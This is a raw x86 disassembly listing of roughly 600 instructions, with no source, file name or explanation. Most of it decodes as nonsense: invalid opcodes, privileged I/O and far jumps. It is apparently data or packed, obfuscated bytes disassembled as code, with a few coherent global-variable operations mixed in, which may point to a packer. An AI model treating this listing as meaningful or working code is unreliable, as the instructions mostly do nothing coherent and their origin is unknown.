  4020c9:	ins    BYTE PTR es:[edi],dx
  4020ca:	cs test ecx,esi
  4020cd:	and    al,0xe9
  4020cf:	or     esp,DWORD PTR [esi+edi*1+0x7ed53f2a]
  4020d6:	add    eax,0xb9f6d564
  4020db:	inc    edi
  4020dc:	iret   
  4020dd:	(bad)  
  4020de:	xchg   ebp,eax
  4020df:	jno    0x4020f3
  4020e1:	sbb    al,0xbd
  4020e3:	mov    ah,0xeb
  4020e5:	jle    0x402082
  4020e7:	pop    ss
  4020e8:	jmp    0xdd29:0x99a4c801
  4020ef:	mov    ecx,0x7e556a29
  4020f4:	sub    DWORD PTR [edx],esi
  4020f6:	dec    esi
  4020f7:	std    
  4020f8:	aad    0xc4
  4020fa:	jp     0x4020f9
  4020fc:	cmp    dh,BYTE PTR [edx-0x65]
  4020ff:	dec    esi
  402100:	add    eax,0x22188497
  402105:	sbb    esi,edx
  402107:	push   0xffffff8b
  402109:	push   0x56
  40210b:	mov    dl,0xcb
  40210d:	lds    ebp,FWORD PTR [ebx-0x40]
  402110:	jle    0x402143
  402112:	lds    eax,FWORD PTR [edi+esi*1]
  402115:	jl     0x402184
  402117:	scas   al,BYTE PTR es:[edi]
  402118:	pop    esp
  402119:	les    edx,FWORD PTR [ecx-0x25]
  40211c:	xchg   edi,eax
  40211d:	test   BYTE PTR [ebp+edx*1-0x623a0d88],bl
  402124:	cmp    edi,DWORD PTR [eax+0x7a]
  402127:	xor    eax,DWORD PTR [ebx-0x4af12526]
  40212d:	sbb    al,0x93
  40212f:	ror    BYTE PTR [edi+edi*1-0x27627c52],0x5e
  402137:	sub    DWORD PTR [esi-0x62],eax
  40213a:	push   ebx
  40213b:	or     cl,BYTE PTR [eax]
  40213d:	sbb    BYTE PTR [edx+0x7c],0x3e
  402141:	aad    0xb
  402143:	scas   eax,DWORD PTR es:[edi]
  402144:	stc    
  402145:	dec    esp
  402146:	xchg   BYTE PTR [ebx+0x7fc98ef1],bh
  40214c:	mov    ch,BYTE PTR [ebx]
  40214e:	xchg   DWORD PTR [ecx],eax
  402150:	mov    ah,0xfc
  402152:	mov    WORD PTR [esi-0x5],?
  402155:	test   ah,dl
  402157:	into   
  402158:	push   0xb
  40215a:	ins    DWORD PTR es:[edi],dx
  40215b:	push   ebp
  40215c:	push   ebp
  40215d:	imul   esp,DWORD PTR [eax-0x2dcdc499],0xf6ab634c
  402167:	shl    BYTE PTR ss:[edx-0xa],cl
  40216b:	sti    
  40216c:	mov    ds:0xaea8c437,al
  402171:	pop    edi
  402172:	pop    ebp
  402173:	fstp   TBYTE PTR [edi+0x3a]
  402176:	mov    dl,0xc5
  402178:	xlat   BYTE PTR ds:[ebx]
  402179:	mov    cl,0xc
  40217b:	jle    0x402140
  40217d:	add    BYTE PTR [esi],cl
  40217f:	or     eax,0xe3ea7902
  402184:	mov    ecx,0x1e65567f
  402189:	or     bl,al
  40218b:	js     0x4021a3
  40218d:	inc    esp
  40218e:	or     edx,eax
  402190:	in     eax,0xcd
  402192:	dec    sp
  402194:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40219b:	mov    edx,DWORD PTR ds:0x434449
  4021a1:	mov    edx,DWORD PTR [edx]
  4021a3:	sbb    DWORD PTR ds:0x4326f0,edx
  4021a9:	jmp    0x40255f
  4021ae:	in     eax,0xd
  4021b0:	lock or al,0x68
  4021b3:	mov    DWORD PTR [ecx-0xf],esi
  4021b6:	push   ecx
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	int3   
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	shl    DWORD PTR [edi],1
  4021bc:	ror    DWORD PTR [esi+0x70700452],0x97
  4021c3:	jge    0x402235
  4021c5:	jo     0x40215f
  4021c7:	stos   DWORD PTR es:[edi],eax
  4021c8:	arpl   WORD PTR [esi+0x7c],sp
  4021cb:	rcr    BYTE PTR [edx],0xba
  4021ce:	shr    DWORD PTR [esi-0x30f513ac],0x33
  4021d5:	pop    edx
  4021d6:	inc    esi
  4021d7:	fsub   QWORD PTR [edi-0x35]
  4021da:	pusha  
  4021db:	rcl    eax,1
  4021dd:	ret    
  4021de:	retf   
  4021df:	cmp    ecx,DWORD PTR [eax]
  4021e1:	call   0xd971:0x1855438e
  4021e8:	xchg   esi,eax
  4021e9:	cmp    eax,0xdc766608
  4021ee:	and    DWORD PTR [edx-0x5d],esp
  4021f1:	test   cl,al
  4021f3:	retf   
  4021f4:	aaa    
  4021f5:	xor    ch,bh
  4021f7:	dec    eax
  4021f8:	repnz lock push cs
  4021fb:	fs push ebp
  4021fd:	pusha  
  4021fe:	scas   eax,DWORD PTR es:[edi]
  4021ff:	outs   dx,DWORD PTR ds:[esi]
  402200:	mov    edx,0xb06cab25
  402205:	stos   BYTE PTR es:[edi],al
  402206:	inc    ebx
  402207:	ret    
  402208:	mov    esp,cs
  40220a:	push   ds
  40220b:	int    0xe2
  40220d:	(bad)  
  40220e:	xor    dh,bh
  402210:	mov    ?,WORD PTR [eax+eax*4]
  402213:	and    al,0x5a
  402215:	in     al,dx
  402216:	jo     0x402201
  402218:	jle    0x402209
  40221a:	stc    
  40221b:	push   eax
  40221c:	in     al,0xc6
  40221e:	adc    al,0xdd
  402220:	mov    WORD PTR [edi-0x13d99ece],?
  402226:	cmp    ch,BYTE PTR ds:0x5a616f0
  40222c:	push   es
  40222d:	shl    DWORD PTR [eax+0x3d28f537],0x3d
  402234:	pop    ds
  402235:	rcl    BYTE PTR [esi+0x4b],cl
  402238:	fucomi st,st(6)
  40223a:	sbb    ch,BYTE PTR [edi-0x7fadd8ce]
  402240:	cmp    edi,ecx
  402242:	mov    DWORD PTR [ebp-0x708403fb],ebx
  402248:	pop    es
  402249:	mov    bh,0x1c
  40224b:	xchg   esp,eax
  40224c:	fisubr DWORD PTR [ebx-0x1d1f7f17]
  402252:	ja     0x402255
  402254:	scas   al,BYTE PTR es:[edi]
  402255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402256:	dec    eax
  402257:	stos   BYTE PTR es:[edi],al
  402258:	cwde   
  402259:	mov    ah,0x6e
  40225b:	aam    0x80
  40225d:	inc    esi
  40225e:	jmp    0x40229c
  402260:	inc    esp
  402261:	cmp    eax,0x881dab41
  402266:	lock fcom QWORD PTR [ebp+0x464699a4]
  40226d:	leave  
  40226e:	jae    0x402201
  402270:	cld    
  402271:	aad    0x4d
  402273:	js     0x402295
  402275:	xor    DWORD PTR gs:0x921abc1b,esp
  40227c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40227d:	aaa    
  40227e:	sub    edi,DWORD PTR [esi+0x5c5a45d6]
  402284:	or     al,0x16
  402286:	fstp   QWORD PTR [ebp+eiz*8+0xbf901e3]
  40228d:	jne    0x4022c3
  40228f:	lds    ecx,FWORD PTR [edi-0x39]
  402292:	xor    cl,BYTE PTR [edx-0x6f]
  402295:	call   0xd575cf34
  40229a:	retf   0x598c
  40229d:	mov    bh,0x6e
  40229f:	push   esi
  4022a0:	ret    
  4022a1:	mov    edx,0x9c68c493
  4022a6:	mov    edi,0xa9c2fe71
  4022ab:	fisttp WORD PTR [eax+0x5fb7850e]
  4022b1:	mov    dh,0x51
  4022b3:	test   DWORD PTR [ebx+0x17cbad39],ecx
  4022b9:	sbb    al,bh
  4022bb:	push   ebp
  4022bc:	sbb    eax,0xd9e1af8f
  4022c1:	push   es
  4022c2:	mov    ch,0x70
  4022c4:	sub    bh,ch
  4022c6:	inc    edi
  4022c7:	in     eax,dx
  4022c8:	add    DWORD PTR [esi+0x58969e5c],edx
  4022ce:	mov    ah,0xec
  4022d0:	cli    
  4022d1:	lds    edi,FWORD PTR [eax+eax*2]
  4022d4:	data16 jge 0x40234b
  4022d7:	pop    esp
  4022d8:	in     eax,dx
  4022d9:	push   edi
  4022da:	jle    0x40227c
  4022dc:	pushf  
  4022dd:	les    ebx,FWORD PTR [ebx+ecx*1-0x63beab79]
  4022e4:	or     BYTE PTR [ecx],bl
  4022e6:	loope  0x40232e
  4022e8:	cmp    ah,BYTE PTR [esi+ebp*4+0x74b8ec2b]
  4022ef:	cmp    al,0x71
  4022f1:	xor    dh,0x1c
  4022f4:	push   ebx
  4022f5:	adc    BYTE PTR [ebx],cl
  4022f7:	popf   
  4022f8:	inc    esi
  4022f9:	ins    DWORD PTR es:[edi],dx
  4022fa:	inc    esi
  4022fb:	pop    ss
  4022fc:	fidiv  DWORD PTR [ebp+ecx*2+0x7f]
  402300:	adc    bh,al
  402302:	mov    esp,0xb1a19e5d
  402307:	frstor [edi+0x5ce156e4]
  40230d:	pusha  
  40230e:	int    0x7f
  402310:	pop    ds
  402311:	sahf   
  402312:	ss (bad) 
  402314:	pop    ds
  402315:	fsub   QWORD PTR [edi+0x76]
  402318:	ins    DWORD PTR es:[edi],dx
  402319:	inc    edx
  40231a:	push   0xffffffff
  40231c:	out    0x39,al
  40231e:	sub    DWORD PTR [edx],ebp
  402320:	imul   ebp,DWORD PTR [eax],0x438b89d
  402326:	or     BYTE PTR [ebx+0x7f],bh
  402329:	jmp    0x8789:0xcfe2df3f
  402330:	mov    edi,0x33a1f638
  402335:	outs   dx,BYTE PTR ds:[esi]
  402336:	retf   
  402337:	jecxz  0x402311
  402339:	sub    ebx,DWORD PTR [ebx]
  40233b:	retf   0x3bf8
  40233e:	mov    bh,0x3c
  402341:	ret    0x98dd
  402344:	jo     0x402317
  402346:	les    ecx,FWORD PTR [ebx+ebp*8-0x7a]
  40234a:	stc    
  40234b:	out    0x9d,eax
  40234d:	rcl    ebx,cl
  40234f:	iret   
  402350:	inc    esi
  402351:	stos   BYTE PTR es:[edi],al
  402352:	fnsave ss:[ebx]
  402355:	jge    0x4022f9
  402357:	mov    eax,ds:0x746f746a
  40235c:	in     al,dx
  40235d:	cmp    ebp,edx
  40235f:	mov    esi,0x6b9d8e7f
  402364:	xchg   esp,eax
  402365:	das    
  402366:	lahf   
  402367:	mov    ds:0x292d3df2,al
  40236c:	mov    ch,0xad
  40236e:	cmp    eax,0x67afb9db
  402373:	bswap  ebp
  402375:	aaa    
  402376:	clc    
  402377:	pop    es
  402378:	mov    DWORD PTR [edi-0x33],edi
  40237b:	dec    ebp
  40237c:	xor    eax,0x5231cadf
  402381:	cmovge ecx,ebp
  402384:	daa    
  402385:	inc    esp
  402386:	and    eax,0x42aa9080
  40238b:	in     eax,0x8d
  40238d:	iret   
  40238e:	mov    eax,ds:0x7b7285cb
  402393:	jne    0x4023a7
  402395:	iret   
  402396:	aaa    
  402397:	test   eax,0xb13c584a
  40239c:	int    0x1b
  40239e:	mov    ah,0xff
  4023a0:	sar    ah,0xf2
  4023a3:	pop    ds
  4023a4:	inc    esp
  4023a5:	cmc    
  4023a6:	mov    dl,0xd4
  4023a8:	add    DWORD PTR [edx-0x51c21fb1],0x5b
  4023af:	and    esi,ecx
  4023b1:	sub    ch,BYTE PTR [edx]
  4023b3:	mov    edx,0x7379ffb0
  4023b8:	test   al,0xf8
  4023ba:	pushf  
  4023bb:	(bad)  
  4023bc:	or     eax,0xa376832
  4023c1:	sbb    al,BYTE PTR [eax-0x5b41dc16]
  4023c7:	xor    BYTE PTR [ebp-0x3d85fc44],ah
  4023cd:	xchg   DWORD PTR [ebx+edi*8],edi
  4023d0:	sar    DWORD PTR [esi-0x7b],cl
  4023d3:	xchg   BYTE PTR [edi],ch
  4023d5:	pop    esi
  4023d6:	push   0x4736eed
  4023db:	push   esi
  4023dc:	lahf   
  4023dd:	std    
  4023de:	or     eax,0xcf2676e8
  4023e3:	cwde   
  4023e4:	in     eax,0xbe
  4023e6:	stos   BYTE PTR es:[edi],al
  4023e7:	pop    ebx
  4023e8:	popa   
  4023e9:	adc    al,0xdb
  4023eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ec:	jecxz  0x402465
  4023ee:	outs   dx,DWORD PTR ds:[esi]
  4023ef:	mov    esp,0x4403a536
  4023f4:	mov    ds,ebx
  4023f6:	mov    dh,0xb8
  4023f8:	pop    ss
  4023f9:	in     al,dx
  4023fa:	xor    ebp,DWORD PTR [ecx]
  4023fc:	or     al,0x63
  4023fe:	jmp    0x78ed:0x8d7be603
  402405:	cmp    dh,BYTE PTR [esi]
  402407:	mov    bh,BYTE PTR [ebx-0x50395865]
  40240d:	mov    bl,0xb6
  40240f:	out    dx,eax
  402410:	add    BYTE PTR [ecx-0x25],ch
  402413:	loope  0x4023c5
  402415:	out    dx,eax
  402416:	rcr    BYTE PTR [edx-0x343f7a42],cl
  40241c:	iret   
  40241d:	daa    
  40241e:	ret    
  40241f:	loopne 0x402407
  402421:	xchg   ebx,eax
  402422:	repz pushf 
  402424:	stos   BYTE PTR es:[edi],al
  402425:	loope  0x4023bd
  402427:	pusha  
  402428:	stos   DWORD PTR es:[edi],eax
  402429:	push   edi
  40242a:	ficom  DWORD PTR [ebp+0x8]
  40242d:	inc    ebp
  40242e:	int3   
  40242f:	sti    
  402430:	jle    0x4023c5
  402432:	(bad)  
  402433:	xchg   ecx,eax
  402434:	into   
  402435:	push   ds
  402436:	cmp    eax,0xf5b1c646
  40243b:	fnsave [eax+edi*1]
  40243e:	sahf   
  40243f:	pop    ss
  402440:	iret   
  402441:	or     DWORD PTR [edx-0x2595eaad],0xf1228b6c
  40244b:	xor    bh,BYTE PTR [ebx+0x66]
  40244e:	sbb    ch,bl
  402450:	inc    ebp
  402451:	cwde   
  402452:	dec    ecx
  402453:	call   0x9edf90e1
  402458:	cwde   
  402459:	inc    ebp
  40245a:	pop    edx
  40245b:	sub    BYTE PTR [edx+0x2e],ah
  40245e:	int    0xc8
  402460:	mov    WORD PTR [edx+ebx*8-0x706ca956],fs
  402467:	sbb    edx,esp
  402469:	int    0xee
  40246b:	popa   
  40246c:	pop    edi
  40246d:	fucomi st,st(4)
  40246f:	mov    ebx,0xa551c019
  402474:	jmp    0x8982:0x29ed2bf8
  40247b:	xor    eax,0xc21e5078
  402480:	mov    eax,0x52eaabc9
  402486:	inc    ecx
  402487:	push   esp
  402488:	xor    dl,BYTE PTR [ebp-0x59e757a1]
  40248e:	xchg   edx,eax
  40248f:	stos   DWORD PTR es:[edi],eax
  402490:	mov    ch,0x69
  402492:	push   edx
  402493:	sar    bh,0xf8
  402496:	out    0xe8,al
  402498:	sar    BYTE PTR [ebx-0x45669127],cl
  40249e:	pop    esp
  40249f:	addr16 pop esp
  4024a1:	scas   al,BYTE PTR es:[edi]
  4024a2:	in     al,dx
  4024a3:	adc    ah,BYTE PTR [ecx-0x36f83b92]
  4024a9:	fcom   DWORD PTR [ecx+ecx*4+0x8c08d6a]
  4024b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024b1:	sub    eax,0x60484281
  4024b6:	push   esi
  4024b7:	sub    al,0x97
  4024b9:	aaa    
  4024ba:	(bad)  
  4024bb:	sub    ebx,edx
  4024bd:	loop   0x402456
  4024bf:	stc    
  4024c0:	imul   esp,esi,0x25
  4024c3:	loope  0x402521
  4024c5:	imul   esi,DWORD PTR [eax],0x43fd1613
  4024cb:	xlat   BYTE PTR ds:[ebx]
  4024cc:	pop    ecx
  4024cd:	dec    ecx
  4024ce:	test   esp,0xa4db3530
  4024d4:	rol    BYTE PTR [esp+esi*2-0x4f],1
  4024d8:	lods   eax,DWORD PTR ds:[esi]
  4024d9:	lock imul eax,DWORD PTR [eax-0x2216fda],0x2f
  4024e1:	dec    ebx
  4024e2:	or     esi,DWORD PTR [ebx+0x4]
  4024e5:	loope  0x4024c1
  4024e7:	mov    bh,0x9c
  4024e9:	or     BYTE PTR [ebx],cl
  4024eb:	stos   BYTE PTR es:[edi],al
  4024ec:	shl    esi,0x0
  4024ef:	cld    
  4024f0:	call   0xe8cfc85
  4024f5:	or     DWORD PTR [edi],edi
  4024f7:	xchg   edx,eax
  4024f8:	(bad)  
  4024f9:	js     0x4024d2
  4024fb:	inc    edi
  4024fc:	pop    esi
  4024fd:	push   0x52
  4024ff:	jo     0x40251c
  402501:	ins    BYTE PTR es:[edi],dx
  402502:	pop    ss
  402503:	mov    es,WORD PTR [edi]
  402505:	jecxz  0x4024a9
  402507:	sbb    edx,DWORD PTR [edx+0x1ba75da]
  40250d:	ja     0x40255d
  40250f:	cmc    
  402510:	cmc    
  402511:	inc    edx
  402512:	push   edx
  402513:	and    BYTE PTR [edi+0x73fc1558],bl
  402519:	adc    al,0xec
  40251b:	and    al,0xfb
  40251d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40251e:	jae    0x402582
  402520:	mov    edx,DWORD PTR [ecx+ecx*2-0x12]
  402524:	cmp    bh,ah
  402526:	retf   0x4475
  402529:	sub    ebp,DWORD PTR [ecx+0x7b9b58da]
  40252f:	test   al,0xcb
  402531:	adc    bl,dh
  402533:	sbb    al,0x44
  402535:	dec    ebp
  402536:	jmp    0x3c21001d
  40253b:	nop
  40253c:	jg     0x402574
  40253e:	push   eax
  40253f:	add    al,0x1
  402541:	aam    0x69
  402543:	shl    ch,1
  402545:	cli    
  402546:	inc    esi
  402547:	ficom  WORD PTR [edi-0x51c74258]
  40254d:	addr16 out dx,al
  40254f:	outs   dx,DWORD PTR ds:[esi]
  402550:	sbb    eax,0xd105f72a
  402555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402556:	fnsave [ebp-0x2f6492ca]
  40255c:	adc    DWORD PTR [ebp-0x7aa748c],ecx
  402562:	sub    ecx,0x6fb0
  402568:	push   esi
  402569:	add    DWORD PTR ds:0x4326f0,ecx
  40256f:	mov    ecx,0x7510855
  402574:	xor    edx,ecx
  402576:	and    esi,0x4f5d
  40257c:	mov    esi,0x32729c
  402581:	push   edi
  402582:	mov    edi,DWORD PTR [ebp+0x10]
  402585:	add    DWORD PTR ds:0x432dd2,0x4326f0
  40258f:	add    edx,esi
  402591:	jmp    0x402947
  402596:	mov    ah,0x31
  402598:	cdq    
  402599:	or     ebx,DWORD PTR [ecx+0x8b1b293]
  40259f:	or     dl,BYTE PTR [ebp+0x24]
  4025a2:	dec    ebp
  4025a3:	lds    edx,FWORD PTR [esi-0x38]
  4025a6:	jmp    0x97b095ab
  4025ab:	jge    0x40261d
  4025ad:	jo     0x4025a3
  4025af:	aam    0x80
  4025b1:	dec    esi
  4025b2:	retf   0x32e2
  4025b5:	and    al,0xbd
  4025b7:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4025b9:	lea    edi,[edx+eiz*2-0x4e]
  4025bd:	xchg   bl,ah
  4025bf:	push   0xffffffea
  4025c1:	rol    DWORD PTR [edi-0x10],1
  4025c4:	inc    ebp
  4025c5:	outs   dx,DWORD PTR ds:[esi]
  4025c6:	hlt    
  4025c7:	jle    0x402613
  4025c9:	pop    edi
  4025ca:	or     al,0x49
  4025cc:	ja     0x4025fa
  4025ce:	ds call 0x594f:0x83de7f5e
  4025d6:	call   FWORD PTR [ecx+ebx*1+0x30]
  4025da:	mov    al,ds:0x12935174
  4025df:	cwde   
  4025e0:	ins    DWORD PTR es:[edi],dx
  4025e1:	scas   eax,DWORD PTR es:[edi]
  4025e2:	lock mov ebx,0xa6872c5
  4025e8:	pop    esp
  4025e9:	cmp    eax,0x35c78ca5
  4025ee:	(bad)  
  4025ef:	cli    
  4025f0:	lea    edx,[ebp+0x53333db6]
  4025f6:	(bad)
  4025fb:	mov    dl,0x5b
  4025fd:	repz ror DWORD PTR [edx+edx*8+0xbcfa60d],1
  402605:	pushf  
  402606:	or     edi,DWORD PTR [ebp-0x78482420]
  40260c:	mov    ecx,0xd8744814
  402611:	pop    esi
  402612:	sbb    BYTE PTR [ecx+ebp*8-0x6],dh
  402616:	pop    ebx
  402617:	out    0xe0,eax
  402619:	dec    ebx
  40261a:	xchg   esi,eax
  40261b:	ja     0x40267a
  40261d:	dec    edx
  40261e:	push   ecx
  40261f:	repnz fimul DWORD PTR [eax+0x1e]
  402623:	stos   DWORD PTR es:[edi],eax
  402624:	add    al,cl
  402626:	adc    BYTE PTR [esi-0x6a],bh
  402629:	mov    ebp,DWORD PTR [edx-0x7b]
  40262c:	stos   DWORD PTR es:[edi],eax
  40262d:	cmp    DWORD PTR [eax-0x748d155c],eax
  402633:	inc    ebp
  402634:	inc    ah
  402636:	dec    esp
  402637:	repz sbb al,0xe8
  40263a:	mov    bl,0x8a
  40263c:	jmp    0x4025d5
  40263e:	jno    0x40260e
  402640:	cs cdq 
  402642:	xor    al,0x4b
  402644:	lods   eax,DWORD PTR ds:[esi]
  402645:	outs   dx,DWORD PTR ds:[esi]
  402646:	pop    ebx
  402647:	imul   edx,DWORD PTR [edi+0x68],0xffffffef
  40264b:	ss ins DWORD PTR es:[edi],dx
  40264d:	push   edx
  40264e:	test   BYTE PTR [eax],cl
  402650:	and    al,0x29
  402652:	test   al,0xf0
  402654:	sbb    BYTE PTR [eax],ch
  402656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402657:	jne    0x402629
  402659:	jmp    0xea86aae1
  40265e:	jnp    0x402678
  402660:	cmp    al,0xaf
  402662:	std    
  402663:	leave  
  402664:	mov    ebx,DWORD PTR [ebx]
  402666:	add    ah,BYTE PTR [edx]
  402668:	hlt    
  402669:	or     ecx,esp
  40266b:	or     BYTE PTR [ecx],dh
  40266d:	xlat   BYTE PTR ds:[ebx]
  40266f:	imul   eax
  402671:	je     0x402646
  402673:	ins    DWORD PTR es:[edi],dx
  402674:	pop    eax
  402675:	iret   
  402676:	adc    al,0x6
  402678:	jmp    0xfe1383a9
  40267d:	jo     0x4026f1
  40267f:	xor    eax,0x738fbfa4
  402684:	mov    al,ds:0x53791b27
  402689:	stos   BYTE PTR es:[edi],al
  40268a:	xor    DWORD PTR [ebx-0x7f],edi
  40268d:	push   ss
  40268e:	out    dx,eax
  40268f:	loopne 0x402637
  402691:	push   esp
  402692:	mov    bl,0x20
  402694:	nop
  402695:	gs ins DWORD PTR es:[edi],dx
  402697:	popf   
  402698:	add    eax,0x97a4771a
  40269d:	cdq    
  40269e:	jae    0x402688
  4026a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026a1:	retf   
  4026a2:	int3   
  4026a3:	aas    
  4026a4:	xchg   ebx,eax
  4026a5:	jo     0x402665
  4026a7:	aaa    
  4026a8:	loopne 0x40268a
  4026aa:	jo     0x4026dd
  4026ac:	fild   QWORD PTR [eax]
  4026ae:	push   eax
  4026af:	sub    dl,BYTE PTR [eax]
  4026b1:	mov    ebx,0x8fffad9
  4026b6:	sub    BYTE PTR [edx+0x678bf572],0x3
  4026bd:	jbe    0x402674
  4026bf:	retf   0xb006
  4026c2:	scas   eax,DWORD PTR es:[edi]
  4026c3:	dec    ebx
  4026c4:	lock ror bl,0x48
  4026c8:	push   esi
  4026c9:	inc    ebx
  4026ca:	jmp    FWORD PTR [eax]
  4026cc:	sti    
  4026cd:	xor    BYTE PTR [ebx+0x7c],dl
  4026d0:	inc    eax
  4026d1:	xor    ah,BYTE PTR [eax+0x15]
  4026d4:	add    ah,bh
  4026d6:	mov    bh,0x54
  4026d8:	xchg   esp,eax
  4026d9:	jno    0x402674
  4026db:	dec    edi
  4026dc:	out    0x12,eax
  4026de:	fild   QWORD PTR [bp+0x7a20]
  4026e3:	(bad)  
  4026e4:	mov    ch,BYTE PTR [eax-0x53f21342]
  4026ea:	or     esi,ebx
  4026ec:	call   0x4bf2:0x10cab974
  4026f3:	mov    edx,edi
  4026f5:	sahf   
  4026f6:	cwde   
  4026f7:	inc    ebx
  4026f8:	mov    edx,0x16bcbbb8
  4026fd:	jb     0x4026e4
  4026ff:	out    0xdb,eax
  402701:	xchg   bl,ch
  402703:	test   al,0x6a
  402705:	and    al,0x25
  402707:	add    esp,DWORD PTR [eax+0x13]
  40270a:	mov    edi,DWORD PTR [ebx-0x4f]
  40270d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40270e:	sbb    esp,edx
  402710:	and    bl,BYTE PTR [edi]
  402712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402713:	mov    esp,0xb0b7c343
  402718:	sbb    dh,BYTE PTR [edi]
  40271a:	cmc    
  40271b:	push   ebx
  40271c:	ja     0x402793
  40271e:	jl     0x402787
  402720:	mov    ebx,DWORD PTR [eax]
  402722:	rol    dl,0x93
  402725:	out    0xed,eax
  402727:	pop    ecx
  402728:	out    0x23,eax
  40272a:	cmp    BYTE PTR [ebx+0x15],al
  40272d:	in     eax,dx
  40272e:	fsub   DWORD PTR [ebp+edi*2-0x36]
  402732:	aaa    
  402733:	jmp    0xa395ce13
  402738:	dec    edx
  402739:	jnp    0x402738
  40273b:	fidivr WORD PTR [edx]
  40273d:	jae    0x4026d3
  40273f:	sbb    BYTE PTR [eax-0x44a9c7ff],bl
  402745:	in     eax,dx
  402746:	sahf   
  402747:	sahf   
  402748:	ret    0xca80
  40274b:	push   ebx
  40274c:	mov    WORD PTR [edx],es
  40274e:	xor    DWORD PTR [eax],ebx
  402750:	cmp    al,0xf1
  402752:	jge    0x40276a
  402754:	test   eax,0x8665a329
  402759:	mov    al,ds:0x4d6b60ff
  40275e:	lds    ebp,FWORD PTR [edi-0x7f]
  402761:	cmp    esp,edi
  402763:	gs jg  0x4027d0
  402766:	fldenv [esi-0x320e1c32]
  40276c:	mov    BYTE PTR [ebx-0x5c],bh
  40276f:	sbb    DWORD PTR [ebx+ecx*2+0x3b8d071],0xffffffaf
  402777:	sub    al,0xb9
  402779:	arpl   WORD PTR [ebx-0x79],sp
  40277c:	(bad)  
  40277d:	and    edi,DWORD PTR [esi+ebx*2-0x4a]
  402781:	inc    ebp
  402782:	jno    0x40270d
  402784:	or     ebp,DWORD PTR [esi-0x4d08c2b4]
  40278a:	sti    
  40278b:	jmp    0x80990f3f
  402790:	and    al,0xfa
  402792:	stc    
  402793:	clc    
  402794:	dec    DWORD PTR [esi]
  402796:	jg     0x402754
  402798:	mov    ebx,0x48c0aaf8
  40279d:	mov    edi,0xed03abb7
  4027a2:	adc    al,0xc8
  4027a4:	retf   0xe47c
  4027a7:	(bad)
  4027aa:	repnz dec edx
  4027ac:	cmp    BYTE PTR [edi],dl
  4027ae:	mov    bh,0x6
  4027b0:	sub    esp,edi
  4027b2:	mov    ?,ebx
  4027b4:	shl    BYTE PTR [ebx-0x4efad33e],cl
  4027ba:	and    cl,BYTE PTR ds:0x63b2627f
  4027c0:	jb     0x402817
  4027c2:	jl     0x4027a1
  4027c4:	test   BYTE PTR [edx-0x29b7fcb8],dl
  4027ca:	pop    edi
  4027cb:	jge    0x4027ce
  4027cd:	push   eax
  4027ce:	push   ss
  4027cf:	add    edi,DWORD PTR [eax+eax*4+0x27ec6236]
  4027d6:	fadd   DWORD PTR [edi]
  4027d8:	pop    ecx
  4027d9:	dec    edi
  4027da:	test   BYTE PTR [eax],dl
  4027dc:	cmp    al,ah
  4027de:	lea    ebx,[eax]
  4027e0:	push   esi
  4027e1:	jmp    0x4027e1
  4027e3:	cmp    eax,0x77b4ae2a
  4027e8:	into   
  4027e9:	adc    eax,esp
  4027eb:	add    eax,0xbc1fabab
  4027f0:	retf   
  4027f1:	mov    eax,ds:0xc25d1a32
  4027f6:	add    eax,0x904d27ac
  4027fb:	sti    
  4027fc:	jecxz  0x402846
  4027fe:	xchg   BYTE PTR ds:0x1281531e,bh
  402804:	in     al,dx
  402805:	and    al,0xcd
  402807:	mov    al,0xd6
  402809:	dec    esi
  40280a:	or     cl,dl
  40280c:	pop    edi
  40280d:	in     al,0x70
  40280f:	stc    
  402810:	pop    esi
  402811:	mov    ebp,DWORD PTR [ebp+0x44]
  402814:	aaa    
  402815:	ins    BYTE PTR es:[edi],dx
  402816:	nop
  402817:	out    0x98,al
  402819:	jl     0x40279b
  40281b:	and    eax,DWORD PTR [esi-0x727bdfab]
  402821:	pop    ebp
  402822:	pop    es
  402823:	rcl    edi,0x7b
  402826:	mov    edi,0xfdcc6ba5
  40282b:	add    BYTE PTR [edx-0x69599918],dh
  402831:	push   ecx
  402832:	adc    DWORD PTR [ecx-0x2c],eax
  402835:	ds mov ebx,0x79630533
  40283b:	mov    bh,0x26
  40283d:	ds dec ecx
  40283f:	mov    ah,0x7f
  402841:	mov    ds:0xdc4a8109,al
  402846:	in     eax,dx
  402847:	inc    ebx
  402848:	mov    dl,0xf3
  40284a:	push   edi
  40284b:	push   eax
  40284c:	(bad)  
  40284e:	fnstenv [ecx]
  402850:	adc    al,0xbe
  402852:	jmp    0x7bf71f71
  402857:	jnp    0x40286a
  402859:	rcl    al,cl
  40285b:	cdq    
  40285c:	mov    bh,BYTE PTR [esi+0x47]
  40285f:	jmp    0x8ed4ad7d
  402864:	sub    edi,DWORD PTR ds:0x832242ce
  40286a:	mov    ?,WORD PTR [eax+eiz*4]
  40286d:	(bad)  
  40286e:	inc    eax
  40286f:	(bad)  
  402870:	mov    cl,0xfa
  402872:	fs out dx,al
  402874:	push   edi
  402875:	dec    eax
  402876:	shl    BYTE PTR [ebp+0x30],1
  402879:	in     al,dx
  40287a:	ret    
  40287b:	ja     0x4028d4
  40287d:	dec    ecx
  40287e:	loope  0x402889
  402880:	rcl    DWORD PTR [eax+eiz*1],0xcf
  402884:	xor    dl,BYTE PTR [ecx]
  402886:	push   cs
  402887:	das    
  402888:	icebp  
  402889:	xchg   esi,eax
  40288a:	enter  0x26ae,0x4d
  40288e:	xor    bl,BYTE PTR [edi+0x2e]
  402891:	fsubr  st(3),st
  402893:	cs cwde 
  402895:	mov    esp,0xdb7c1917
  40289a:	mov    ds:0xb3740a8a,eax
  40289f:	ds push ss
  4028a1:	rol    BYTE PTR [edx],cl
  4028a3:	cli    
  4028a4:	leave  
  4028a5:	ss pop es
  4028a7:	mov    WORD PTR [edx+eax*1],?
